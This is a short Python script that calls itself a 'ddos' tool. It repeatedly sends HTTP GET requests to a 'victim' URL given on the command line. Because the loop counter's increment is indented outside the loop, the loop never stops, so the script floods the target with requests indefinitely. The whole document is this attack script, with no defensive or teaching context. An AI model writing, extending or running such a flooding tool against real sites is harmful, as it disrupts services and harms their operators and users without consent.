
import requests, sys, time

print("victim: " + sys.argv[1])
print("[*] starting ddos...")
print()
time.sleep(1)

i = 1

while i < 10:
  r = requests.get(sys.argv[1])
  print("[*] request sent")
i+=1
